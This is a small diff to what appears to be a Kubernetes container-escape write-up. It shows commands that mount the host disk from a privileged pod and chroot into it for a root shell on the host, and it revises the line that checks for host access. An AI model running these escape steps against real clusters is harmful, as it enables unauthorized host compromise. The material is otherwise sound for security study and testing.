@@ -56,7 +56,7 @@ mkdir -p /mnt/host
 /tmp/mnt mount /dev/vda1 /mnt
 /usr/bin/coreutils --coreutils-prog=chroot /mnt /bin/bash
 # you're now root on the HOST filesystem
-hostname; ls /var/lib/kubelet /root
+ls /var/lib/kubelet /root   # host-only proof — hostname is still the pod's UTS name, not host proof
 ```
 
 Same flow works in `kube-proxy-*` (privileged) if you prefer that narrative.
